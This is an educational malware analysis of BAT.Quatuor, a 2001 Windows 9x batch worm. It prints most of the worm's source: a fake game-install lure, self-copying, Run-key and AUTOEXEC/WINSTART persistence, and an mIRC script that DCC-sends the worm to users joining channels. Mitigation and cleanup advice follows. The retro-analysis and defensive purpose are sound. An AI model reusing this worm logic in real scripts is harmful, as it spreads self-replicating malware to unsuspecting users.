# Dissecting BAT.Quatuor: A Batch Worm Using .REG Autoruns and mIRC DCC 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
BAT.Quatuor (June 2001) is a Windows 9x/ME–era batch worm. It relies on legacy startup hooks, Registry import files, and mIRC automation to persist and propagate. Rather than using exploits or compiled code, it chains simple shell features: copies itself to the Windows directory, imports a `.reg` file to create Run keys, appends messages to `AUTOEXEC.BAT`, and hijacks mIRC’s `script.ini` to auto-send the worm to users who join IRC channels. It also drops a README on the Desktop as a calling card.

Understanding this sample is useful for retro analysis and for hardening legacy systems: it shows how minimal shell commands can still modify system behavior, set autoruns, and move laterally via user tools. The worm’s artifacts are deterministic—file names, Registry keys, and script content—making it straightforward to detect and remediate when present in archives or old environments.

## Overview of the Malware 🐛
BAT.Quatuor’s behavior is linear and userland-only, aiming for persistence and social spread.

- Self-replication: Copies itself to `%WINDIR%\Quatuor.bat` and sets the file read-only to deter casual deletion.
- Persistence via .REG: Builds and launches a `Win32dll.reg` file that sets a Run entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (value name `BAT.Quatuor`, data `Quatuor.bat`). It also overwrites cosmetic fields (RegisteredOwner/Organization) and sets Internet Explorer’s Start Page.
- Boot artifact: Backs up `C:\AUTOEXEC.BAT` to `C:\autoexec.quatuor` then appends banner lines and a pause, setting the file read-only. Also adds a one-liner to `WINSTART.BAT` to invoke the worm at startup if present.
- mIRC propagation: Drops a minimal `script.ini` that triggers on channel JOIN to DCC-send `%WINDIR%\Quatuor.bat` to newcomers, copying it into common mIRC install paths if they exist.
- User-facing note: Writes `%WINDIR%\Desktop\ReadMe.txt` branding the sample.

There is no network command-and-control; all actions leverage local shell and IRC client behavior. The worm assumes a Win9x/ME environment with `command.com`, Registry import via `regedit`, and mIRC installed in standard paths.

## Source Code Analysis 🔬
The batch file is short and organized by labels (`:debut`, `:reg`, `:autoexec`, `:mirc`, `:fin`). Error handling is minimal; early prompts aim to gain user consent.

### Initial prompt and stealth
```bat
@echo off
cls

echo PLEASE ACCEPT THE NEXT QUESTION TO INSTALL THE GAME
pause
ctty nul
```
- Presents a lure (“install the game”) and pauses. `ctty nul` redirects the console I/O to NUL on DOS/Win9x, effectively hiding subsequent script output from the user.

### Copy to Windows and protect the file
```bat
:debut
copy %0 %windir%\Quatuor.bat
attrib +r %windir%\Quatuor.bat
```
- `%0` is the running batch itself; the worm copies it to `%WINDIR%` under a plausible name and sets the read-only attribute.

### Registry autoruns via .REG file, plus cosmetic changes
```bat
:reg
if exist %windir%\Win32dll.reg goto autoexec

echo @if exist %windir%\Quatuor.bat %windir%\Quatuor.bat >>%windir%\winstart.bat

echo REGEDIT4 >>%windir%\Win32dll.reg

echo [HKEY_LOCAL_MACHINE\...\Run] >>%windir%\Win32dll.reg
echo "BAT.Quatuor"="Quatuor.bat" >>%windir%\Win32dll.reg

echo [HKEY_LOCAL_MACHINE\...\CurrentVersion] >>%windir%\Win32dll.reg
echo "RegisteredOwner"="PetiK" >>%windir%\Win32dll.reg

echo [HKEY_CURRENT_USER\...\Internet Explorer\Main] >>%windir%\Win32dll.reg
echo "Start Page"="http://www.vxgas.fr.fm" >>%windir%\Win32dll.reg

start %windir%\Win32dll.reg
```
- Builds a Registry import file with the REGEDIT4 header. Key effects:
  - `Run` value `BAT.Quatuor=Quatuor.bat` ensures the worm runs at boot, provided the working directory is `%WINDIR%` or the file is resolvable via PATH. Using only the filename is brittle but often worked on Win9x where `%WINDIR%` is the shell’s working directory.
  - Writes `RegisteredOwner` and `RegisteredOrganization` strings (cosmetic author tags).
  - Repoints IE Start Page.
- Also appends a line to `WINSTART.BAT` as an additional startup hook; `winstart.bat` executes at Windows launch on Win9x systems.

### AUTOEXEC banner and backup
```bat
:autoexec
if exist C:\autoexec.quatuor goto mirc
copy C:\autoexec.bat C:\autoexec.quatuor

echo.>>C:\autoexec.bat
echo @echo off >>C:\autoexec.bat
echo echo BAT.Quatuor by PetiK >>C:\autoexec.bat
echo pause>>C:\autoexec.bat
attrib +r C:\autoexec.bat
```
- Preserves the original `AUTOEXEC.BAT` then appends a banner and a `pause`, creating a visible artifact at next DOS boot. Sets the file read-only to complicate cleanup.

### mIRC JOIN hook for DCC send
```bat
:mirc
> C:\script.ptk echo [script]
>>C:\script.ptk echo n0=on 1:JOIN:#:{
>>C:\script.ptk echo n1= /if ( nick == $me ) { halt }
>>C:\script.ptk echo n2= /.dcc send $nick %windir%\Quatuor.bat
>>C:\script.ptk echo n3=}

if exist C:\mirc\mirc.ini    copy C:\script.ptk C:\mirc\script.ini
if exist C:\mirc32\mirc.ini  copy C:\script.ptk C:\mirc32\script.ini
if exist C:\progra~1\mirc\mirc.ini   copy C:\script.ptk C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\mirc.ini copy C:\script.ptk C:\progra~1\mirc32\script.ini

del C:\script.ptk
```
- Constructs a minimal `script.ini`. Line `n1` attempts to avoid self-triggering but contains a bug: `nick` lacks the `$` and the condition syntax is off. Line `n2` uses mIRC’s DCC send to push the worm to the joining user, a classic P2P propagation vector.

### Desktop note and cleanup
```bat
> %windir%\Desktop\ReadMe.txt echo BAT.Quatuor by PetiK (c)2001. Made in France
attrib +r %windir%\Desktop\ReadMe.txt

:fin
if exist Win32dll.reg del Win32dll.reg
```
- Leaves a text note on the Desktop. Final cleanup attempts to delete `Win32dll.reg` in the current directory (not in `%WINDIR%` where it was created), a minor logic oversight.

## Mitigation and Defense Strategies 🛡️
- Block legacy autoruns: On legacy systems, disable processing of `WINSTART.BAT` and audit for startup batch references. On modern systems, monitor and control `Run` and `RunOnce` keys; flag values that reference bare filenames or point to `%WINDIR%\*.bat`.
- Registry import controls: Restrict `regedit.exe`/`.reg` execution via application control. Intercept attempts by user processes to import `.reg` files in system directories. Use EDR to alert on `regedit` launched by command shells.
- Constrain shell scripts: Use AppLocker/WDAC to restrict `cmd.exe` and batch execution for standard users. Block untrusted `.bat`/`.cmd` files from `%TEMP%` and user-writable locations. Enable Script Block Logging and process command-line auditing where available.
- mIRC policy: If IRC is sanctioned, disable `script.ini` automation and DCC auto-send in client policy. Monitor for creation/modification of `script.ini` in common install paths and flag lines with `ON 1:JOIN` and `/dcc send`.
- File integrity checks: Watch for new or modified `%WINDIR%\Quatuor.bat`, `%WINDIR%\Desktop\ReadMe.txt`, and edits to `C:\AUTOEXEC.BAT` and `%WINDIR%\WINSTART.BAT`. Enforce ACLs to prevent user processes from modifying Windows and root partition boot files.
- Browser/start page hardening: Enforce baseline IE/Edge homepage policies via Group Policy; alert on unexpected changes from user processes.
- Least privilege: Running as a standard user limits writes to `HKLM` and `%WINDIR%`, reducing the worm’s effectiveness.
- Incident response: Restore original `AUTOEXEC.BAT` from `C:\autoexec.quatuor`, remove `%WINDIR%\Quatuor.bat`, revert Run key entries, delete `script.ini` payloads from mIRC directories, and restore registered owner/organization values if altered.

## Conclusion
BAT.Quatuor demonstrates how little more than a handful of DOS/Windows shell commands can achieve persistence and spread: copy a batch to the Windows folder, seed autoruns via a `.reg` file and `WINSTART.BAT`, and leverage mIRC’s `script.ini` to push the file through IRC. Despite its age and reliance on legacy behaviors, the sample’s approach—user-assisted execution, Registry import, and client automation—remains a useful teaching case. Strong application control, legacy autorun hygiene, and monitoring for deterministic artifacts (file paths, Run keys, `script.ini` patterns) make this class of threat easy to prevent and clean up, especially in modern environments where these legacy hooks are deprecated or disabled by default.
